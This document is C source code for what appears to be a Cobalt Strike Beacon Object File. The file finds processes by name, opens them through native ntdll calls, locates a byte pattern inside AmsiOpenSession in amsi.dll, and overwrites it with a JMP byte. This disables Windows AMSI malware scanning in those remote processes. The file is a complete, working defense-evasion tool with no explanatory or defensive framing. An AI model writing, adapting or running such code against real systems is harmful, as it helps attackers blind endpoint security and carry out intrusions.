#include <windows.h>
#include "../beacon.h"

typedef LONG NTSTATUS;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct tagPROCESSENTRY32 {
    DWORD dwSize;
    DWORD cntUsage;
    DWORD th32ProcessID;
    ULONG_PTR th32DefaultHeapID;
    DWORD th32ModuleID;
    DWORD cntThreads;
    DWORD th32ParentProcessID;
    LONG pcPriClassBase;
    DWORD dwFlags;
    CHAR szExeFile[MAX_PATH];
} PROCESSENTRY32, *LPPROCESSENTRY32;


#define TH32CS_SNAPPROCESS 0x00000002
#define STATUS_SUCCESS 0
#define PROCESS_VM_QUERY_INFORMATION 0x0010
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

typedef NTSTATUS (NTAPI *NtOpenProcess_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
typedef NTSTATUS (NTAPI *NtReadVirtualMemory_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(HANDLE, PVOID*, SIZE_T*, ULONG, PULONG);

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$Process32First(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$Process32Next(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);

DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$Process32First(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$Process32Next(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT int __cdecl MSVCRT$_stricmp(const char*, const char*);


// JMP patch (skip bytes) — adjust accordingly
char patchByte = 0xEB;

int searchPattern(BYTE* data, DWORD size, BYTE* pat, DWORD patSize) {
    for (DWORD i = 0; i <= size - patSize; i++) {
        DWORD j;
        for (j = 0; j < patSize; j++) {
            if (pat[j] != '?' && data[i + j] != pat[j]) break;
        }
        if (j == patSize) return i + 3;
    }
    return -1;
}

void patchRemoteSyscall(DWORD pid, NtOpenProcess_t NtOpenProcess, NtReadVirtualMemory_t NtRead, NtWriteVirtualMemory_t NtWrite, NtProtectVirtualMemory_t NtProtect) {
    BYTE pattern[] = { 0x48,'?','?', 0x74,'?',0x48,'?' ,'?' ,0x74 };
    DWORD patSize = sizeof(pattern);

    HANDLE hProc = NULL;
    CLIENT_ID cid = { (HANDLE)(ULONG_PTR)pid, NULL };
    //OBJECT_ATTRIBUTES oa = { sizeof(oa), NULL, NULL, NULL, NULL, NULL };
	OBJECT_ATTRIBUTES oa = {
		.Length = sizeof(oa),
		.RootDirectory = NULL,
		.ObjectName = NULL,
		.Attributes = 0,
		.SecurityDescriptor = NULL,
		.SecurityQualityOfService = NULL
	};
    if (!NT_SUCCESS(NtOpenProcess(&hProc, PROCESS_VM_READ|PROCESS_VM_WRITE|PROCESS_VM_OPERATION|PROCESS_VM_QUERY_INFORMATION, &oa, &cid))) {
        BeaconPrintf(CALLBACK_ERROR, "NtOpenProcess failed %d", pid);
        return;
    }

    HMODULE hAmsi = KERNEL32$LoadLibraryA("amsi.dll");
    FARPROC fn = hAmsi ? KERNEL32$GetProcAddress(hAmsi, "AmsiOpenSession") : NULL;
    if (!fn) {
        BeaconPrintf(CALLBACK_ERROR, "Resolve AmsiOpenSession failed");
        NtProtect = NULL;
        KERNEL32$CloseHandle(hProc);
        return;
    }

    BYTE buf[1024];
    SIZE_T bytes = 0;
    if (!NT_SUCCESS(NtRead(hProc, fn, buf, sizeof(buf), &bytes))) {
        BeaconPrintf(CALLBACK_ERROR, "ReadMemory failed %d", pid);
        KERNEL32$CloseHandle(hProc);
        return;
    }

    int off = searchPattern(buf, sizeof(buf), pattern, patSize);
    if (off < 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "Pattern missing in %d", pid);
        KERNEL32$CloseHandle(hProc);
        return;
    }
    BYTE *target = (BYTE*)fn + off;

    ULONG oldProt = 0;
    PVOID basePtr = target;
    SIZE_T regionSize = 1;
    if (!NT_SUCCESS(NtProtect(hProc, &basePtr, &regionSize, PAGE_EXECUTE_READWRITE, &oldProt))) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to change perms");
        KERNEL32$CloseHandle(hProc);
        return;
    }

    if (!NT_SUCCESS(NtWrite(hProc, target, &patchByte, 1, &bytes))) {
        BeaconPrintf(CALLBACK_ERROR, "WriteMemory failed");
        KERNEL32$CloseHandle(hProc);
        return;
    }

    // restore perms
    NtProtect(hProc, &basePtr, &regionSize, oldProt, &oldProt);
    KERNEL32$CloseHandle(hProc);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] AMSI syscall-patched in %d", pid);
}

void go(char *args, int len) {
    datap p;
    char *procName;

    BeaconDataParse(&p, args, len);
    procName = BeaconDataExtract(&p, NULL);
    if (!procName) {
        BeaconPrintf(CALLBACK_ERROR, "Usage: <process.exe>");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target: %s", procName);

    HMODULE ntdll = KERNEL32$LoadLibraryA("ntdll.dll");
    if (!ntdll) {
        BeaconPrintf(CALLBACK_ERROR, "Load ntdll failed");
        return;
    }

    // Resolve syscalls
    NtOpenProcess_t NtOpenProcess = (NtOpenProcess_t)KERNEL32$GetProcAddress(ntdll, "NtOpenProcess");
    NtReadVirtualMemory_t NtRead = (NtReadVirtualMemory_t)KERNEL32$GetProcAddress(ntdll, "NtReadVirtualMemory");
    NtWriteVirtualMemory_t NtWrite = (NtWriteVirtualMemory_t)KERNEL32$GetProcAddress(ntdll, "NtWriteVirtualMemory");
    NtProtectVirtualMemory_t NtProtect = (NtProtectVirtualMemory_t)KERNEL32$GetProcAddress(ntdll, "NtProtectVirtualMemory");
    if (!NtOpenProcess || !NtRead || !NtWrite || !NtProtect) {
        BeaconPrintf(CALLBACK_ERROR, "Resolve syscalls failed");
        return;
    }

    PROCESSENTRY32 pe = {0};
    pe.dwSize = sizeof(pe);
    HANDLE hs = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if (hs == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "Snapshot failed");
        return;
    }

    if (KERNEL32$Process32First(hs, &pe)) {
        do {
            if (MSVCRT$_stricmp(pe.szExeFile, procName)==0) {
                patchRemoteSyscall(pe.th32ProcessID, NtOpenProcess, NtRead, NtWrite, NtProtect);
            }
        } while (KERNEL32$Process32Next(hs, &pe));
    }
    KERNEL32$CloseHandle(hs);
}

